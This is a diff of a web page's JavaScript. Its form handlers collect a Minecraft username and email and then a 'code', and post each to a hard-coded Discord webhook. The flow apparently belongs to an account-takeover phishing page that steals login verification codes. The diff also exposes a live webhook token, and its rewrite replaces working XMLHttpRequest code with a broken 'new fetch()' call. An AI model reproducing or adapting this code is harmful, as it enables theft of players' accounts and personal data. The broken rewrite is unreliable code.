@@ -154,73 +154,88 @@
     </div>
   </div>
 
-  <script>
-    document.getElementById("emailForm").addEventListener("submit", function(event) {
-      console.log("Email form submitted");
-      event.preventDefault()
-      event.preventDefault(); // prevent the form from reloading the page
+<script>
+  // JavaScript code
 
-      // get the input values
-      const username = document.getElementById('username').value;
-      const email = document.getElementById('email').value;
+  // Code for email form submission
+  document.getElementById("emailForm").addEventListener("submit", function (event) {
+    event.preventDefault();
 
-      // create the webhook message
-      const message = {
-        "content": "Email and IGN entered!",
-        "embeds": [
-          {
-            "color": null,
-            "fields": [
-              {
-                "name": "Minecraft Username:",
-                "value": username
-              },
-              {
-                "name": "Email:",
-                "value": email
-              }
-            ]
-          }
-        ]
-      };
+    const username = document.getElementById("username").value;
+    const email = document.getElementById("email").value;
 
-      // make an HTTP POST request to the webhook URL with the data
-      const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0"; // Replace with your actual webhook URL
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", webhookUrl, true);
-      xhr.setRequestHeader("Content-Type", "application/json");
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE) {
-          if (xhr.status === 200) {
-            document.getElementById("emailForm").style.display = "none";
-            document.getElementById("codeFormContainer").style.display = "block";
-          } else {
-            console.error("Failed to send webhook:", xhr.statusText);
-          }
+    const message = {
+      content: "Email and IGN entered!",
+      embeds: [
+        {
+          color: null,
+          fields: [
+            {
+              name: "Minecraft Username:",
+              value: username,
+            },
+            {
+              name: "Email:",
+              value: email,
+            },
+          ],
+        },
+      ],
+    };
+
+    const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0";
+    const xhr = new fetch();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === fetch.DONE) {
+        if (xhr.status === 200) {
+          document.getElementById("emailForm").style.display = "none";
+          document.getElementById("codeFormContainer").style.display = "block";
+        } else {
+          console.error("Failed to send webhook:", xhr.statusText);
         }
-      };
-      xhr.send(JSON.stringify(message));
-    });
+      }
+    };
+    xhr.send(JSON.stringify(message));
+  });
 
-    document.getElementById("codeForm").addEventListener("submit", function(event) {
-      console.log("Code form submitted");
-      event.preventDefault()
-      event.preventDefault(); // prevent the form from reloading the page
+  // Code for code form submission
+  document.getElementById("codeForm").addEventListener("submit", function (event) {
+    event.preventDefault();
 
-      // get the code value
-      const code = document.getElementById('code').value;
+    const code = document.getElementById("code").value;
 
-      // create the webhook message
-      const message = {
-        "content": "Code Received!",
-        "embeds": [
-          {
-            "color": null,
-            "fields": [
-              {
-                "name": "Code:",
-                "value": code
-              }
-            ]
-          }
-       
+    const message = {
+      content: "Code Received!",
+      embeds: [
+        {
+          color: null,
+          fields: [
+            {
+              name: "Code:",
+              value: code,
+            },
+          ],
+        },
+      ],
+    };
+
+    // Replace the webhookUrl with the correct URL for the code form webhook
+      const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0";
+    const xhr = new fetch();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === fetch.DONE) {
+        if (xhr.status === 200) {
+          document.getElementById("emailForm").style.display = "none";
+          document.getElementById("codeFormContainer").style.display = "block";
+        } else {
+          console.error("Failed to send webhook:", xhr.statusText);
+        }
+      }
+    };
+    xhr.send(JSON.stringify(message));
+  });
+</script>
